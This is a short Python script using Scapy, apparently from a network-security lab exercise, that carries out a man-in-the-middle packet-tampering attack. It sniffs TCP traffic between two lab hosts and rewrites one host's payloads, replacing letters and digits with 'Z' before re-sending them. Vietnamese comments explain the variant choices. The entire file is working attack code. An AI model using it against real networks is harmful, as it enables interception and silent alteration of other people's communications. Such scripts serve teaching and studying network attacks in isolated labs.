#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

print("Start MITM attack ...")

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B: 
         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].payload)
         del(newpkt[TCP].chksum)

         if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            print("data : ",data, "length : ",len(data))
            # Nếu bạn chỉ muốn thay thế các các ký tự từ a->z , từ A->Z và các số từ 0-9
            newdata = re.sub('[0-9a-zA-Z]', 'Z', data.decode())
            # Nếu bạn muốn tất cả các phím nhập vào đều được thay đổi thành Z 
            # newdata = 'Z'*len(data)
            send(newpkt/newdata)
         else: 
             send(newpkt)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].chksum)
         send(newpkt)

f = 'tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)'   
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
